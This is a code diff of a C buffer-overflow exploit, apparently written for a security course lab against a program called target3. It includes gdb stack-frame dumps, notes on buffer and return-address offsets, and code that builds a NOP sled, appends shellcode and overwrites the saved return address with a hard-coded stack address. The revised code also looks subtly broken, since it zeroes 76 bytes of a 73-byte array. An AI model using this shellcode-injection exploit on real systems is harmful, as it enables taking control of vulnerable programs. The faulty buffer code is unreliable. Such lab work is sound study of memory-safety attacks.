@@ -6,33 +6,39 @@
 
 #define TARGET "../targets/target3"
 
-/*(gdb) info foo
-Stack level 0, frame at 0x2021ff00:
-rip = 0x400c2a in foo (target3.c:24); saved rip = 0x400cba
-called by frame at 0x2021ff30
-source language c.
-Arglist at 0x2021fef0, args: arg=0x7fffffffe2ec "test"
-Locals at 0x2021fef0, Previous frame's sp is 0x2021ff00
-Saved registers:
-rbp at 0x2021fef0, rip at 0x2021fef8
+/*foo
+(gdb) info frame
+Stack level 0, frame at 0x2021fe60:
+ rip = 0x400ba8 in foo (target3.c:24); saved rip 0x400c49
+ called by frame at 0x2021fe90
+ source language c.
+ Arglist at 0x2021fe50, args: arg=0x7fffffffe2bd "test"
+ Locals at 0x2021fe50, Previous frame's sp is 0x2021fe60
+ Saved registers:
+  rbp at 0x2021fe50, rip at 0x2021fe58
 */
-//targ is 0x2021fe70
+//buf is 0x2021fe10
+//arg is 0x2021fe08
+//buf to return address is 72 bytes
 
 /* info bar
-Stack level 0, frame at 0x2021fea0:
- rip = 0x400bb6 in bar (target3.c:10); saved rip = 0x400c50
- called by frame at 0x2021ff00
+(gdb) info frame
+Stack level 0, frame at 0x2021fe00:
+ rip = 0x400b3b in bar (target3.c:10); saved rip 0x400bd9
+ called by frame at 0x2021fe60
  source language c.
- Arglist at 0x2021fe90, args: arg=0x7fffffffe2ec "test", 
-    targ=0x2021feb0 "AAAA", ltarg=88
- Locals at 0x2021fe90, Previous frame's sp is 0x2021fea0
+ Arglist at 0x2021fdf0, args: arg=0x7fffffffe2bd "test",
+    targ=0x2021fe10 "AAAA", ltarg=88
+ Locals at 0x2021fdf0, Previous frame's sp is 0x2021fe00
  Saved registers:
-  rbp at 0x2021fe90, rip at 0x2021fe98
+  rbp at 0x2021fdf0, rip at 0x2021fdf8
 
 */
 
-//buffer is at 0x2021feb0
-//arg is at 0x2021fea8
+//len is at 0x2021fde8
+//i is at 0x2021fdec
+//targ is at 0x2021fdd0
+ 
 
 //return address to buffer is 72 bytes
 
@@ -43,31 +49,26 @@ main ( int argc, char * argv[] )
 {
 	char *	args[3];
 	char *	env[1];
-	char tmp[77];
+	unsigned char tmp[73];
 	int i;
 	
+	for (i=0; i<76; i++){
+		tmp[i]= '\x00';
+	}
 
-	tmp[0] = '\x90';
-	tmp[1] = '\x90';
-	tmp[2] = '\x90';
-	tmp[3] = '\x90';
-	tmp[4] = '\x90';
-	tmp[5] = '\x90';
-	tmp[6] = '\x90';
-	tmp[7] = '\x90';
-	
+	//save space for "AAAA"
 
 	strcat(tmp,shellcode);
 	
-	for (i=53;i<72;i++){
+	for (i=45;i<72;i++){
 		tmp[i] = '\x90';
 	}
 	
-	tmp[72]='\x70';
-	tmp[73]='\xfe';
-	tmp[74]='\x21';
-	tmp[75]='\x20';
-	tmp[76]='\x00';
+	tmp[68]='\x10';
+	tmp[69]='\xfe';
+	tmp[70]='\x21';
+	tmp[71]='\x20';
+	tmp[72]='\x00';
 	
 
 	args[0] = TARGET;
